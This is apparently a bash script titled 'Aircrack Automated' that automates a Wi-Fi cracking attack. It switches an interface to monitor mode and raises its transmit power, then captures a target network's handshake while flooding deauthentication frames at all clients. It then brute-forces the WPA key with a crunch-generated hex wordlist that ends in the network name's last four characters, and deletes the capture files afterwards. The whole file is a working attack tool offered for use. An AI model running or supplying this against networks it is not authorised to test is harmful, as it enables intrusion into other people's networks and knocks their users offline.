#!/bin/bash
clear
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo
echo Enter Interface Name:
read interface
#interface=$(ifconfig | grep wl | cut -d ":" -f1)
airmon-ng check kill
sudo ip link set $interface down
sudo iw dev $interface set type monitor
sudo ip link set $interface up
sudo iw $interface set txpower fixed 3000
echo Enter BSSID Of Target
read bid
echo $bid
echo Enter Channel Of Target
read chnl
#xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
client=FF:FF:FF:FF:FF:FF
airodump-ng --ig -w cap -c $chnl --bssid $bid $interface & sleep 6 &&
xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $interface"
sleep 4
clear
echo Enter network name
read name
crunch 8 8 1234567890ABCDEF + + + -t @@@@${name: -4} | aircrack-ng cap-01.cap -e "$name" -w-
echo Disabling Monitor Mode........
airmon-ng stop $interface
echo Deleting Handshake Files.......
rm cap*
echo done!
